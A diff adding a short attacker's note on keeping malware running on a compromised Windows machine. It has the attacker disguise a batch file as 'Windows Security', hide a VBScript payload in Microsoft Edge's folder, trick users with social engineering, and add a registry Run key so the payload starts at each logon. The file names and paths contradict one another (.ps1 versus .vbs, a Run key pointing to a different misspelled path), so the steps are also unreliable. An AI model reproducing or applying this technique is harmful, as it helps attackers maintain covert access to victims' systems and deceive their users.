@@ -1,0 +1,23 @@
+Users generally don't mess around with windows registry so its a best place for us to implement changes to the system
+
+After getting initial Access through implant 
+
+1. Deploy a batch file
+
+Filename: Windows Security.batch
+Content: 
+        @echo off
+        wscript.exe "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.vbs"
+
+
+2. Deploy vbsript 
+
+Filename: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.ps1
+Content:
+        payload script
+
+Sometimes vbscript notification will popup, use social engineering tactics to fool the users and then deploy actual Files
+
+Then run this 
+
+reg.exe add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsSecurity /d C:\Users\Administartor\vbscript.vbs /t REG_SZ /f
